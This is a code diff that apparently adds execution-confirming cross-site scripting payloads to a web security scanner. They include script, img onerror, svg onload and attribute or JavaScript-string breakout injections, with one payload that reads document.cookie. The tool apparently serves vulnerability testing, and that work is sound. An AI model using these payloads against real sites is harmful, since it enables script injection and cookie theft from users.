@@ -162,6 +162,33 @@ def all_payloads(canary: str) -> list[Payload]:
 
 
 # --------------------------------------------------------------------------- #
+# Execution-proof payloads: each calls window.__talxss('<canary>') so the
+# headless verifier can confirm the JavaScript actually RAN (not just reflected).
+# They also fall back to alert('<canary>') for sinks where our hook is absent.
+# --------------------------------------------------------------------------- #
+_EXEC: list[Payload] = [
+    Payload("exec-script", "<script>window.__talxss('{C}')</script>", "html", "reflected", "high"),
+    Payload("exec-img-onerror", "<img src=x onerror=\"window.__talxss('{C}')\">", "html", "reflected", "high"),
+    Payload("exec-svg-onload", "<svg onload=\"window.__talxss('{C}')\">", "html", "reflected", "high"),
+    Payload("exec-attr-dq", "\"><img src=x onerror=\"window.__talxss('{C}')\">", "attr_double", "reflected", "high"),
+    Payload("exec-attr-sq", "'><img src=x onerror='window.__talxss(\"{C}\")'>", "attr_single", "reflected", "high"),
+    Payload("exec-js-break", "';window.__talxss('{C}');'", "script", "reflected", "high"),
+    Payload("exec-js-dqbreak", "\";window.__talxss('{C}');\"", "script", "reflected", "high"),
+    Payload("exec-close-script", "</script><script>window.__talxss('{C}')</script>", "script", "reflected", "high"),
+    Payload("exec-cookie", "<img src=x onerror=\"window.__talxss('{C}:'+document.cookie)\">",
+            "html", "cookie", "high", "Proves document.cookie is readable from executed JS (not sent anywhere)."),
+]
+
+
+def exec_payloads(canary: str, context: str = "any") -> list[Payload]:
+    """Payloads that CALL back with the canary, for headless execution checks."""
+    sel = [p for p in _EXEC if context in ("any", p.context) or p.context == "any"]
+    if not sel:
+        sel = [p for p in _EXEC if p.context == "html"]
+    return _rendered(sel, canary)
+
+
+# --------------------------------------------------------------------------- #
 # Wordlist source: the operator's curated .txt lists in payload_lists/
 # --------------------------------------------------------------------------- #
 def available_wordlists() -> list[str]:
